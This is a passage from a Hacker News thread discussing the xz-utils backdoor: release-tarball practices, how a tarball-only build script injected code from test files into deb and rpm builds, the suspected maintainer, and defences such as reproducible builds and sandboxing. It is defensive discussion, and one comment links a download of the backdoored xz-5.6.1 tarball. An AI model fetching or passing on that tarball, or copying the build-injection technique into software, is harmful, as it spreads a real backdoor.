a separate tarball (typically with `make dist`). I know because two projects I co-maintain do this. | | --- | --- | --- | | | |  |  | [bhaak](user?id=bhaak) [9 months ago](item?id=39872638)   | [root](#39866771) | [parent](#39872062) | [next](#39872217) [–]  It's common but it's plain wrong. A "release" should allow to build the project without installing dependencies that are only there for compilation. Autotools are not guaranteed to be installed on any system. For example they aren't on the OSX runners of GitHub Action. It's also an issue with UX. autoreconf fails are pretty common. If you don't make it easy for your users to actually use your project, you lose out on some. | | --- | --- | --- | | | |  |  | [GrayShade](user?id=GrayShade) [9 months ago](item?id=39872751)   | [root](#39866771) | [parent](#39872638) | [next](#39876740) [–]  > A "release" should allow to build the project without installing dependencies that are only there for compilation. Like a compiler or some -devel packages? | | --- | --- | --- | | | |  |  | [bhaak](user?id=bhaak) [9 months ago](item?id=39874394)   | [root](#39866771) | [parent](#39872751) | [next](#39876740) [–]  If the compiler is some customized or hard to build version then yes, they should be included. The more steps you add to get to the final product the more likely it is to run into problems. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39876740)   | [root](#39866771) | [parent](#39872638) | [prev](#39872751) | [next](#39872217) [–]  > [...] A "release" should allow to build the project without installing dependencies that are only there for compilation. Built artifacts shouldn't require build-time dependencies to be installed, yes, but we're talking about source distributions. Including `./configure` is just a way of reducing the configuration-/build-time dependencies for the user. > Autotools are not guaranteed to be installed on any system. [...] Which is why this is common practice. > It's common but it's plain wrong. Strong word. I'm not sure it's "plain wrong". We could just require that users have autoconf installed in order to build from sources, or we could commit `./configure` whenever we make a release, or we could continue this approach. (For some royal we.) But stopping this practice won't prevent backdoors. I think a lot of people in this thread are focusing on this as if it was the source of all evils, but it's really not. | | --- | --- | --- | | | |  |  | [Too](user?id=Too) [9 months ago](item?id=39872217)   | [root](#39866771) | [parent](#39872062) | [prev](#39872638) | [next](#39867905) [–]  Whats the problem of running “autoreconf -fi” though? Very strange argument. It’s like saying our source release only contains a prebuilt binary, otherwise the user has to run “make”. If that’s such a big hassle for your downstream consumers, maybe one should use something better than autoconf in the first place. | | --- | --- | --- | | | |  |  | [meinersbur](user?id=meinersbur) [9 months ago](item?id=39874354)   | [root](#39866771) | [parent](#39872217) | [next](#39872689) [–]  Autotools are not backwards-compatible. Often only a specific version of autotools works. Only the generated configure is supposed to be portable. It's also not the distribution model for an Autotools project. Project distributions would include a handwritten configure file that users would run: The usual `./configure && make && make install`. Since those configure scripts became more and more complex for supporting diverse combinations of compiler and OS, the idea of autotools was for maintainers to generate it. It was not meant to be executed by the user: <https://en.wikipedia.org/wiki/GNU_Autotools#Usage> | | --- | --- | --- | | | |  |  | [bhaak](user?id=bhaak) [9 months ago](item?id=39872689)   | [root](#39866771) | [parent](#39872217) | [prev](#39874354) | [next](#39867905) [–]  For running autoreconf you need to have autotools installed and even then it can fail. I have autotools installed and despite that autoreconf fails for me on the xz git repository. The idea of having configure as a convoluted shell script is that it runs everywhere without any additional. If it isn't committed to the repository you're burdening your consumers with having compilation dependencies installed that are not needed for running your software. | | --- | --- | --- | | | |  |  | [Too](user?id=Too) [9 months ago](item?id=39872763)   | [root](#39866771) | [parent](#39872689) | [next](#39867905) [–]  Yes...For running gcc you need to have gcc installed. You don’t need gcc to run the software. It’s not burdening anyone that gcc was needed to build the software. It’s very standard practice to have development dependencies. Why should autoconf be treated exceptionally? If they fail despite being available it’s either a sign of using a fragile tool or a badly maintained project. Both can be fixed without shipping a half-pre-compiled-half-source repo. | | --- | --- | --- | | | |  |  | [bhaak](user?id=bhaak) [9 months ago](item?id=39874380)   | [root](#39866771) | [parent](#39872763) | [next](#39867905) [–]  The configure script is not a compilation artifact. The more steps you add to get final product the more errors are possible. It's much easier for you as the project developer to generate the script so you should do it. If it's easier for you to generate the binary, you should do it as well (reproducible binaries of course). That's why Windows binaries are often shipped. With Linux binaries this is much harder (even though there are solutions now). With OSX it depends if you have the newest CPU architecture or not. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39877665)   | [root](#39866771) | [parent](#39874380) | [next](#39867905) [–]  > If it's easier for you to generate the binary, you should do it as well (reproducible binaries of course). I think that's the crux of what you're saying. But consider that if Fedora, Debian, etc. accepted released, built artifacts from upstreams then it would be even easier to introduce backdoors! Fedora, Debian, Nix -all the distros- need to build *from sources*, preferably from sources taken from upstreams' version control repositories. Not that that would prevent backdoors -it wouldn't!- but that it would at least make it easier to investigate later as the sources would all be visible to the distros (assuming non-backdoored build tools). | | --- | --- | --- | | | |  |  | [o11c](user?id=o11c) [9 months ago](item?id=39867905)   | [parent](#39866771) | [prev](#39869208) | [next](#39873017) [–]  For a long time, there was one legitimately annoying disadvantage to the git-generated tarballs though - they lost tagging information. However, since git 2.32 (released June 2021; presumably available on GitHub by August 2021 when they blogged about it) you can use `$Format:%(describe)$` ... limited to once per repository for performance reasons. | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39868247)   | [root](#39866771) | [parent](#39867905) | [next](#39869120) [–]  Except this change was made in 2023, it is just scary how good this threat actor was. | | --- | --- | --- | | | |  |  | [legobmw99](user?id=legobmw99) [9 months ago](item?id=39869120)   | [root](#39866771) | [parent](#39867905) | [prev](#39868247) | [next](#39873017) [–]  I believe they also do not include sub modules, which is a big disadvantage for some projects | | --- | --- | --- | | | |  |  | [xvilka](user?id=xvilka) [9 months ago](item?id=39871201)   | [root](#39866771) | [parent](#39869120) | [next](#39873017) [–]  Yes. Also, GitHub recently made some upgrades that forced checksum changes on the autogenerated archives: [https://github.blog/changelog/2023-01-30-git-archive-checksu...](https://github.blog/changelog/2023-01-30-git-archive-checksums-may-change/) | | --- | --- | --- | | | |  |  | [kzrdude](user?id=kzrdude) [9 months ago](item?id=39873017)   | [prev](#39866771) | [next](#39872984) [–]  Jia Tan "cleaned up" in all their ZSTD branches some hours ago, probably hiding something <https://github.com/JiaT75/zstd/branches/all> | | --- | --- | --- | | | |  |  | [sroussey](user?id=sroussey) [9 months ago](item?id=39897095)   | [parent](#39873017) | [next](#39873719) [–]  GitHub/Microsoft likely has a backup. I’d be getting those out about now. | | --- | --- | --- | | | |  |  | [zamalek](user?id=zamalek) [9 months ago](item?id=39873719)   | [parent](#39873017) | [prev](#39897095) | [next](#39872984) [–]  Bad move. Destroying evidence is a felony. | | --- | --- | --- | | | |  |  | [delfinom](user?id=delfinom) [9 months ago](item?id=39875622)   | [root](#39873017) | [parent](#39873719) | [next](#39873826) [–]  If only you could prosecute people in adversarial countries for a felony, lol. | | --- | --- | --- | | | |  |  | [maerF0x0](user?id=maerF0x0) [9 months ago](item?id=39876206)   | [root](#39873017) | [parent](#39875622) | [next](#39873826) [–]  You can if you can get them extradited (from any country, not just their home country). | | --- | --- | --- | | | |  |  | [cypress66](user?id=cypress66) [9 months ago](item?id=39873826)   | [root](#39873017) | [parent](#39873719) | [prev](#39875622) | [next](#39876383) [–]  If you are this deep into it, it doesn't matter. | | --- | --- | --- | | | |  |  | [JackSlateur](user?id=JackSlateur) [9 months ago](item?id=39876383)   | [root](#39873017) | [parent](#39873719) | [prev](#39873826) | [next](#39872984) [–]  Not everywhere, and only if *you* can prove that were evidences :) | | --- | --- | --- | | | |  |  | [zh3](user?id=zh3) [9 months ago](item?id=39872984)   | [prev](#39873017) | [next](#39873194) [–]  Comment from Andres Freund on how and why he found it [0] and more information on the LWN story about the backdoor. Recommend people read this to see how close we came (and think about what this is going to mean for the future). [0] <https://lwn.net/Articles/967194/> | | --- | --- | --- | | | |  |  | [eBombzor](user?id=eBombzor) [9 months ago](item?id=39876584)   | [parent](#39872984) | [next](#39873194) [–]  That man deserves a Nobel Prize | | --- | --- | --- | | | |  |  | [dhx](user?id=dhx) [9 months ago](item?id=39873194)   | [prev](#39872984) | [next](#39871081) [–]  A mirror of the offending repository created by someone else is available at [1]. GitHub should be keeping the evidence in the open (even if just renamed or archived in a safer format) instead of deleting it/hiding it away. The offending tarball for v5.6.1 is easier to find, an example being.[2] m4/.gitignore was updated 2 weeks ago to hide build-to-host.m4 that is only present in the release tarball and is used to inject the backdoor at build time.[3] [1] <https://git.phial.org/d6/xz-analysis-mirror> [2] <https://mirrors.xtom.ee/gentoo/distfiles/9f/xz-5.6.1.tar.gz> [3] [https://git.phial.org/d6/xz-analysis-mirror/commit/4323bc3e0...](https://git.phial.org/d6/xz-analysis-mirror/commit/4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e) | | --- | --- | --- | | | |  |  | [xyzzy\_plugh](user?id=xyzzy_plugh) [9 months ago](item?id=39871081)   | [prev](#39873194) | [next](#39866894) [–]  This gist summarizes the current situation very well: [https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78b...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) Definitely looking like they were most likely some sort of state actor. This is very well done and all in plain sight. It's reassuring that it was discovered but given a simple audit of the release build artifacts would have raised alarms, how prevalent is this behavior in other projects? Terrifying stuff. | | --- | --- | --- | | | |  |  | [wood\_spirit](user?id=wood_spirit) [9 months ago](item?id=39866894)   | [prev](#39871081) | [next](#39866130) [–]  A lot of eyes will be dissecting this specific exploit, and investigating this specific account, but how can we find the same kind of attack in a general way if it’s being used in other projects and using other contributor names? | | --- | --- | --- | | | |  |  | [treffer](user?id=treffer) [9 months ago](item?id=39867553)   | [parent](#39866894) | [next](#39870691) [–]  1. Everything must be visible. A diff between the release tarball and tag should be unacceptable. It was hidden from the eyes to begin with. 2. Build systems should be simple and obvious. Potentially not even code. The inclusion was well hidden. 3. This was caught through runtime inspection. It should be possible to halt any Linux system at runtime, load debug symbols and map \_everything\_ back to the source code. If something can't map back then regard it as a potentially malicious blackbox. There has been a strong focus and joint effort to make distributions reproducible. What we haven't managed though is prove that the project compromises only of freshly compiled content. Sorta like a build time / runtime "libre" proof. This should exist for good debugging anyway. It wouldn't hinder source code based backdoors or malicious vulnerable code. But it would detect a backdoor like this one. Just an initial thought though, and probably hard to do, but not impossibly hard, especially for a default server environment. | | --- | --- | --- | | | |  |  | [mac-chaffee](user?id=mac-chaffee) [9 months ago](item?id=39870691)   | [parent](#39866894) | [prev](#39867553) | [next](#39867307) [–]  Build-related fixes are only treating the symptoms, not the disease. The real fix would be better sandboxing and capability-based security[1] built into major OSes which make backdoors a lot less useful. Why does a compression library have the ability to "install an audit hook into the dynamic linker" or anything else that isn't compressing data? No amount of SBOMs, reproducible builds, code signing, or banning binaries will change the fact that one mistake anywhere in the stack has a huge blast radius. [1]: <https://en.wikipedia.org/wiki/Capability-based_security> | | --- | --- | --- | | | |  |  | [mkleczek](user?id=mkleczek) [9 months ago](item?id=39872405)   | [root](#39866894) | [parent](#39870691) | [next](#39874804) [–]  That's why I always raise concerns about JEP 411 - removal of SecurityManager from Java without any replacement. | | --- | --- | --- | | | |  |  | [someguydave](user?id=someguydave) [9 months ago](item?id=39874804)   | [root](#39866894) | [parent](#39870691) | [prev](#39872405) | [next](#39867307) [–]  Just ban autotools | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39867307)   | [parent](#39866894) | [prev](#39870691) | [next](#39873434) [–]  Note that the malicious binary is fairly long and complex. This attack can be stopped by disallowing any binary testdata or other non-source code to be on the build machines during a build. You could imagine a simple process which checks out the code, then runs some kind of entropy checker over the code to check it is all unminified and uncompressed source code, before finally kicking off the build process. autogenerated files would also not be allowed to be in the source repo - they're too long and could easily hide bad stuff. Instead the build process should generate the file during the build. | | --- | --- | --- | | | |  |  | [trulyrandom](user?id=trulyrandom) [9 months ago](item?id=39868014)   | [root](#39866894) | [parent](#39867307) | [next](#39873434) [–]  This requires a more comprehensive redesign of the build process. Most Linux distributions also run the tests of the project they're building as part of the build process. | | --- | --- | --- | | | |  |  | [uecker](user?id=uecker) [9 months ago](item?id=39869800)   | [root](#39866894) | [parent](#39868014) | [next](#39873434) [–]  The code that runs during testing should not be allowed to affect the package though. If this is possible, this is misdesigned. | | --- | --- | --- | | | |  |  | [saulrh](user?id=saulrh) [9 months ago](item?id=39870049)   | [root](#39866894) | [parent](#39869800) | [next](#39873434) [–]  Profile guided optimization is, unfortunately, wildly powerful. And it has a hard requirement that a casual link exists from test data (or production data!) to the build process. | | --- | --- | --- | | | |  |  | [afiodorov](user?id=afiodorov) [9 months ago](item?id=39873434)   | [parent](#39866894) | [prev](#39867307) | [next](#39870339) [–]  We should be able to produce a tar and a proof that tar was produced from a specific source code. Quote from the article: ```     That line is not in the upstream source of build-to-host, nor is build-to-host used by xz in git.  ``` Zero Knowledge virtual machines, like cartesi.io, might help with this. Idea is to take the source, run a bunch of computational steps (compilation & archiving) and at the same time produce some kind of signature that certain steps were executed. The verifiers can then easily check that the signature and indeed be convinced that the code was executed as it is claimed and source code wasn't tampered with. The advantage of Zero-Knowledge technology in this case is that one doesn't need to repeat the computational steps themselves nor rely on a trusted party to do it for them (like automated build - that can also be compromised by the state actors). Just having the proof solves this trust problem mathematically: if you have the proof & the tar, you can quickly check source code that produced the tar wasn't modified. | | --- | --- | --- | | | |  |  | [renonce](user?id=renonce) [9 months ago](item?id=39874293)   | [root](#39866894) | [parent](#39873434) | [next](#39870339) [–]  I don’t think zero knowledge systems are practical at the moment. It will take over around 8 orders of magnitude more compute and memory to produce a ZKP proof of generic computation like compilation. Even 2 orders of magnitude is barely acceptable. | | --- | --- | --- | | | |  |  | [afiodorov](user?id=afiodorov) [9 months ago](item?id=39874766)   | [root](#39866894) | [parent](#39874293) | [next](#39870339) [–]  I've been told verifiable builds are possible already, I don't know how practical though: twitter.com/stskeeps/status/1774019709739872599 | | --- | --- | --- | | | |  |  | [JonChesterfield](user?id=JonChesterfield) [9 months ago](item?id=39870339)   | [parent](#39866894) | [prev](#39873434) | [next](#39869463) [–]  The Guix full source bootstrap is looking less paranoid as time goes on | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929016)   | [root](#39866894) | [parent](#39870339) | [next](#39869463) [–]  I haven't looked at Guix but in the discussions around this exploit for NixOS they mentioned that regenerating autoshit for xz-utils would not be something they can/want to do because that would add a lot more dependencies to the bootstrap before other packages can be build. Kind of funny how a requirement for bootstrapped builds can add a requirement for trusting not-quite-binaries-but-also-not-really-source blobs. | | --- | --- | --- | | | |  |  | [Avamander](user?id=Avamander) [9 months ago](item?id=39869463)   | [parent](#39866894) | [prev](#39870339) | [next](#39866130) [–]  More reproducible builds, maybe even across distributions? Builds based on specific commits (no tarballs like in this case), possibly signed (just for attribution, not for security per se)? Allow fewer unsafe/runtime modifications The way oss-fuzz ASAN was disabled should've been a warning on its own, if these issues weren't so common. I'm not aware of any efforts towards it, but libraries should also probably be more confined to only provide intended functionality without being able to hook elsewhere? | | --- | --- | --- | | | |  |  | [q3k](user?id=q3k) [9 months ago](item?id=39866130)   | [prev](#39866894) | [next](#39868372) [–]  NixOS/Pkgs 23.11 unaffected, unstable contains backdoored implementations (5.6.0, 5.6.1) but their OpenSSH sshd does not seem to link against systemd/liblzma, and the backdoor doesn't get configured in (only happens on .deb/.rpm systems). | | --- | --- | --- | | | |  |  | [jchw](user?id=jchw) [9 months ago](item?id=39866209)   | [parent](#39866130) | [next](#39867961) [–]  It may not have really mattered much for NixOS: > b) argv[0] needs to be /usr/sbin/sshd For once, the lack of FHS interoperability is a benefit, if only on accident. | | --- | --- | --- | | | |  |  | [q3k](user?id=q3k) [9 months ago](item?id=39866226)   | [root](#39866130) | [parent](#39866209) | [next](#39867961) [–]  Right, but in this case it's not even compiled it, which is arguably better than compiled in but assumed dormant :) (at least until someone actually does a full analysis of the payload). | | --- | --- | --- | | | |  |  | [o11c](user?id=o11c) [9 months ago](item?id=39867961)   | [parent](#39866130) | [prev](#39866209) | [next](#39882189) [–]  Note that NixOS has a unique advantage in that `dlopen` is easier to analyze, but you do have to check for it. A lot of people are looking only at `ldd` and missing that they can be vulnerable at runtime. | | --- | --- | --- | | | |  |  | [lostmsu](user?id=lostmsu) [9 months ago](item?id=39882189)   | [parent](#39866130) | [prev](#39867961) | [next](#39868015) [–]  Not affected by the latest CVE, but the author had unrestricted access to xz for 2 years, so I would say it is affected until the other contributions are proven safe (never gonna happen) or it reverts to pre-adversarial actor version. | | --- | --- | --- | | | |  |  | [dandanua](user?id=dandanua) [9 months ago](item?id=39868015)   | [parent](#39866130) | [prev](#39882189) | [next](#39868372) [–]  That's one of the advantages of NixOS - viruses and mass hacks have lesser chance to function due to how different this OS is. Until it gets more popular, of course. | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39868401)   | [root](#39866130) | [parent](#39868015) | [next](#39877749) [–]  It's actually not an advantage. The reason why the exploit wasn't included is because the attacker specifically decided to only inject x86\_64 Debian and RHEL to reduce the chances of this getting detected. | | --- | --- | --- | | | |  |  | [bmacho](user?id=bmacho) [9 months ago](item?id=39873316)   | [root](#39866130) | [parent](#39868401) | [next](#39877749) [–]  Then it's an actual advantage. | | --- | --- | --- | | | |  |  | [lambdanil](user?id=lambdanil) [9 months ago](item?id=39877749)   | [root](#39866130) | [parent](#39868015) | [prev](#39868401) | [next](#39868372) [–]  That's just security by obscurity, not something I'd consider a good security measure. | | --- | --- | --- | | | |  |  | [bhaak](user?id=bhaak) [9 months ago](item?id=39868372)   | [prev](#39866130) | [next](#39866311) [–]  I looked at the differences between the GitHub repository and released packages. About 60 files are in a release package that are not in the repo (most are generated files for building) but also some of the .po files have changes. That's devastating. If you don't build your release packages from feeding "git ls-files" into tar, you are doing it wrong. | | --- | --- | --- | | | |  |  | [sesuximo](user?id=sesuximo) [9 months ago](item?id=39875390)   | [parent](#39868372) | [next](#39869968) [–]  I think this is unfortunately very common practice | | --- | --- | --- | | | |  |  | [icommentedtoday](user?id=icommentedtoday) [9 months ago](item?id=39869968)   | [parent](#39868372) | [prev](#39875390) | [next](#39872089) [–]  Why not `git archive`? | | --- | --- | --- | | | |  |  | [bhaak](user?id=bhaak) [9 months ago](item?id=39874425)   | [root](#39868372) | [parent](#39869968) | [next](#39872089) [–]  Because I didn't know about it. Although if I look at its documentation, it's already a somewhat complicate invocation with unclear effects (lots of commandline options). Git seems to not be able to do KISS. git ls-files and tar is a simple thing everybody understands and can do without much issues. | | --- | --- | --- | | | |  |  | [cryptonector](user?id=cryptonector) [9 months ago](item?id=39872089)   | [parent](#39868372) | [prev](#39869968) | [next](#39866311) [–]  <https://news.ycombinator.com/item?id=39872062> | | --- | --- | --- | | | |  |  | [colanderman](user?id=colanderman) [9 months ago](item?id=39866311)   | [prev](#39868372) | [next](#39866477) [–]  The latest commit from the user who committed those patches is weirdly a simplification of the security reporting process, to not request as much detail: [https://github.com/tukaani-project/xz/commit/af071ef7702debe...](https://github.com/tukaani-project/xz/commit/af071ef7702debef4f1d324616a0137a5001c14c) Not sure what to make of this. | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39868348)   | [parent](#39866311) | [next](#39871078) [–]  I think the reason is pretty obvious. They want you to waste more time after you've submitted the security report and maximize the amount of back and forth. Basically the hope is that they'd be able to pester you with requests for more info/details in order to "resolve the issue" which would give them more time to exploit their targets. | | --- | --- | --- | | | |  |  | [colanderman](user?id=colanderman) [9 months ago](item?id=39871078)   | [parent](#39866311) | [prev](#39868348) | [next](#39866833) [–]  That repository is now disabled. But here's a similar change to the .github repository of tukaani-project from @JiaT75 to the bug report template: ```     + or create a private Security Advisory instead.  ``` Under a commit titled "Wrap text on Issue template .yaml files." [1] [https://github.com/tukaani-project/.github/commit/44b766adc4...](https://github.com/tukaani-project/.github/commit/44b766adc413b7b7ccfa2bfdd89d2540e88739ca) | | --- | --- | --- | | | |  |  | [caelum19](user?id=caelum19) [9 months ago](item?id=39866833)   | [parent](#39866311) | [prev](#39871078) | [next](#39866477) [–]  Potentially the purpose is that if someone goes to the effort to get those details together, they are more likely to send the same report to other trusted individuals. Maybe it was originally there to add legitimacy, then they got a report sent in, and removed it to slow the spread of awareness | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39867272)   | [root](#39866311) | [parent](#39866833) | [next](#39866477) [–]  > Affected versions of XZ Utils Most people, to find the affected versions, would either have to bisect or delve deep enough to find the offending commit. Either of which would reveal the attacker. By not asking for the version, there is a good chance you just report "It's acting oddly, plz investigate". | | --- | --- | --- | | | |  |  | [20after4](user?id=20after4) [9 months ago](item?id=39866477)   | [prev](#39866311) | [next](#39866955) [–]  > "Docs: Simplify SECURITY.md." [https://github.com/tukaani-project/xz/commit/af071ef7702debe...](https://github.com/tukaani-project/xz/commit/af071ef7702debef4f1d324616a0137a5001c14c) Removes instructions about details relevant to security reports. Heh, nice one. | | --- | --- | --- | | | |  |  | [Tenobrus](user?id=Tenobrus) [9 months ago](item?id=39866955)   | [prev](#39866477) | [next](#39870954) [–]  It looks like the person who added the backdoor is in fact the current co-maintainer of the project (and the more active of the two): <https://tukaani.org/about.html> | | --- | --- | --- | | | |  |  | [kzrdude](user?id=kzrdude) [9 months ago](item?id=39872949)   | [parent](#39866955) | [next](#39868515) [–]  In various places they say Lasse Collin is not online right now, but he did make commits a week ago <https://git.tukaani.org/?p=xz.git;a=summary> | | --- | --- | --- | | | |  |  | [kzrdude](user?id=kzrdude) [9 months ago](item?id=39868515)   | [parent](#39866955) | [prev](#39872949) | [next](#39870954) [–]  Makes me wonder if he's an owner of the github organization, and what happens with it now? | | --- | --- | --- | | | |  |  | [CGamesPlay](user?id=CGamesPlay) [9 months ago](item?id=39870954)   | [prev](#39866955) | [next](#39868494) [–]  Why has Github disabled the (apparently official) xz repository, but left the implicated account open to the world? It makes getting caught up on the issue pretty difficult, when GitHub has revoked everyone's access to see the affected source code. <https://github.com/tukaani-project/xz> vs <https://github.com/JiaT75> | | --- | --- | --- | | | |  |  | [dzaima](user?id=dzaima) [9 months ago](item?id=39871595)   | [parent](#39870954) | [next](#39868494) [–]  The account has been suspended for a while, but for whatever reason that's not displayed on the profile itself (can be seen at <https://github.com/Larhzu?tab=following>). Repo being disabled is newer, and, while annoying and realistically likely pointless, it's not particularly unreasonable to take down a repository including a real backdoor. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929099)   | [root](#39870954) | [parent](#39871595) | [next](#39868494) [–]  Taking down the repo prevents more people inadvertendly pulling and building the backdoor so that makes sense. They should have immediately rehosted and archived the state at a different URL which makes it clear to not use it. | | --- | --- | --- | | | |  |  | [5p4n911](user?id=5p4n911) [9 months ago](item?id=39868494)   | [prev](#39870954) | [next](#39867335) [–]  The author (Jia Tan) also changed the xz.tukaani.org (actually the github.io, where the main contributor is, surprise, also them) release description to state all new releases are signed by their OpenPGP key. I'd guess that was one of the first steps to a complete project takeover. I hope Lasse Collin still has control of his accounts, though the CC on the kernel mailing list looks kind of suspicious to me. | | --- | --- | --- | | | |  |  | [weinzierl](user?id=weinzierl) [9 months ago](item?id=39867335)   | [prev](#39868494) | [next](#39868230) [–]  The backdoor is not in the C source directly, but a build script uses data from files in the test dir to only create the backdoor in the release tars. Did I summarize that correctly? | | --- | --- | --- | | | |  |  | [soneil](user?id=soneil) [9 months ago](item?id=39868180)   | [parent](#39867335) | [next](#39868230) [–]  That's how I understand it. A build script that's in the releases tarballs but not the git repo, checks to see if it's being run as part of the debian/build or rpm build processes, and then injects content from one of the "test" files. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868788)   | [root](#39867335) | [parent](#39868180) | [next](#39868230) [–]  I could imagine another similar attack done against an image processing library, include some "test data" of corrupted images that should "clean up" (and have it actually work!) but the corruption data itself is code to be run elsewhere. | | --- | --- | --- | | | |  |  | [elchief](user?id=elchief) [9 months ago](item?id=39868230)   | [prev](#39867335) | [next](#39868158) [–]  "Amazon Linux customers are not affected by this issue, and no action is required. AWS infrastructure and services do not utilize the affected software and are not impacted. Users of Bottlerocket are not affected." [https://aws.amazon.com/security/security-bulletins/AWS-2024-...](https://aws.amazon.com/security/security-bulletins/AWS-2024-002/) | | --- | --- | --- | | | |  |  | [liveoneggs](user?id=liveoneggs) [9 months ago](item?id=39868158)   | [prev](#39868230) | [next](#39869088) [–]  The best part is everyone disabling security tests that started failing | | --- | --- | --- | | | |  |  | [ozgune](user?id=ozgune) [9 months ago](item?id=39869088)   | [prev](#39868158) | [next](#39874777) [–]  I read through the entire report and it gradually got more interesting. Then, I got to the very end, saw Andres Freund's name, and it put a smile on my face. :) Who else would have run a PostgreSQL performance benchmark and discover a major security issue in the process? | | --- | --- | --- | | | |  |  | [jaromilrojo](user?id=jaromilrojo) [9 months ago](item?id=39874777)   | [prev](#39869088) | [next](#39870842) [–]  This is another proof that systemd is an anti-pattern for security: with its crawling and ever growing web of dependencies, it extends the surface of vulnerability to orders of magnitude, and once embraced not even large distro communities can defend you from that. A malware code injection in upstream xz-tools is a vector for remote exploitation of the ssh daemon due to a dependency on systemd for notifications and due to systemd's call to dlopen() liblzma library (CVE-2024-3094). The resulting build interferes with authentication in sshd via systemd. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39874894)   | [parent](#39874777) | [next](#39878053) [–]  Please take the systemd trolling to Reddit. They likely targeted xz specifically because it’s so widely used but there are dozens of other libraries which are potential candidates for an attack on sshd, much less everything else which has a direct dependency unrelated to systemd (e.g. dpkg). Rather than distracting, think about how the open source projects you use would handle an attack like this where someone volunteers to help a beleaguered maintainer and spends time helpfully taking on more responsibilities before trying to weaken something. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929258)   | [root](#39874777) | [parent](#39874894) | [next](#39874907) [–]  Those other libraries dependend on by sshd are hopefully more closely monitored. The upstream sshd developers probably did not even consider that liblzma could end up being loaded in the process. Make excuses for systemd all you want but loading multiple additional libraries into crytical system deamons just to write a few bytes into a socket is inexcusable and directly enabled this attack vector. | | --- | --- | --- | | | |  |  | [jaromilrojo](user?id=jaromilrojo) [9 months ago](item?id=39874907)   | [root](#39874777) | [parent](#39874894) | [prev](#39929258) | [next](#39878053) [–]  You are distracting from facts with speculations and trolling FUD. I refer to what is known and has happened, you are speculating on what is not known. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39875836)   | [root](#39874777) | [parent](#39874907) | [next](#39878053) [–]  Your claim is an appeal to emotion trying to build support for a position the Linux community has largely rejected. Starting with the goal rather than looking unemotionally at the facts means that you’re confusing your goal with the attackers’ – they don’t care about a quixotic attempt to remove systemd, they care about compromising systems. Given control of a package which is on most Linux systems and a direct dependency of many things which are not systemd - run apt-cache rdepends liblzma5! – they can choose whatever they want to accomplish that goal. That could be things like a malformed archive which many things directly open or using something similar to this same hooking strategy to compromise a different system component. For example, that includes things like kmod and dpkg so they could target sshd through either of those or, if their attack vector wasn’t critically dependent on SSH, any other process running on the target. Attacking systemd for this is like saying Toyotas get stolen a lot without recognizing that you’re just describing a popularity contest. | | --- | --- | --- | | | |  |  | [geggo98](user?id=geggo98) [9 months ago](item?id=39878053)   | [parent](#39874777) | [prev](#39874894) | [next](#39874793) [–]  Actually you have a point. A collection of shell scripts (like the classical init systems) have obviously a smaller attack surface. In this case the attacker used some integration code with systemd to attack the ssh daemon. So sshd without systemd integration is safe against this specific attack. In general, I’m not convinced that systemd makes things less secure. I have the suspicion that the attacker would just have used a different vector, if there was no systemd integration. After all it looks like the attacker was also trying to integrate exploits in owner libraries, like zstd. Still I would appreciate it, if systemd developers would find a better protection against supply chain attacks. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39879571)   | [root](#39874777) | [parent](#39878053) | [next](#39878561) [–]  It’s also tricky to reason about risk: for example, ShellShock caused a bunch of vulnerabilities in things which used shell scripts and the classic SysV Init system was a factor in a ton of vulnerabilities over the years because not having a standard way to do things like drop privileges or namespace things, manage processes, difficulties around managing chroot, etc. meant that you had a bunch of people implementing code which ran with elevated privileges because it needed to do things like bind to a low network port and they either had vulnerabilities in the privileged part or messed up some detail. I think in general it’s been much better in the systemd era where so much of that is builtin but I have been happy to see them starting to trim some of the things like the compression format bindings and I expect this will spur more. | | --- | --- | --- | | | |  |  | [jaromilrojo](user?id=jaromilrojo) [9 months ago](item?id=39878561)   | [root](#39874777) | [parent](#39878053) | [prev](#39879571) | [next](#39874793) [–]  I really appreciate your tone and dialectic reasoning, thanks for your reply. And yes, as simple as it sounds, I believe that shell scripts help a lot to maintain mission critical tools. One hands-on example is <https://dyne.org/software/tomb> where I took this approach to replace whole disk encryption which is nowadays also dependent on systemd-cryptsetup. | | --- | --- | --- | | | |  |  | [temp12237792](user?id=temp12237792) [9 months ago](item?id=39880141)   | [root](#39874777) | [parent](#39878561) | [next](#39874793) [–]  Is this an example of a simple and clean solution via shell script? I have some stylistic doubts: 1. What "exitcode" is set for: ```   exitcode=1   exit 1  ``` 2. I see a lot of "return $?". Why "$?" is returned if by default the shell returns the return value of the last command? Just ti name a few: ```   lklfuse -o type=ext4 "${loop}" "$mnt"   return $?   ...   veracrypt  --text --non-interactive -d "$file"   return $?   ...   mount "$loop" "$mnt"   return $?  ``` 3. Aren't =, != etc. used to compare strings and -eq, -ne, -gt etc. used to compare numbers? I see lot of numbers compared as strings, e.g.: ```   [ $? = 0 ]   [ $? != 0 ]   [ $exitcode = 0 ]  ``` 4. There are lot of "cat <<EOF" blocks without indentation. I understand that this is made because the shell expects "EOF" on the line start, but there is a special syntax designed on purpose for this use case, simply put a dash between << and the token, e.g. "cat <<-EOF". In this case: ```   tomb_init() {    system="`uname -s`"    case "$system" in     FreeBSD)      cat <<-EOF      create=posix_create      format=posix_format      map=posix_map      mount=freebsd_mount      close=freebsd_close      EOF      ;;     Linux)  ``` 5. Aren't backtick deprecated in favor of $()? | | --- | 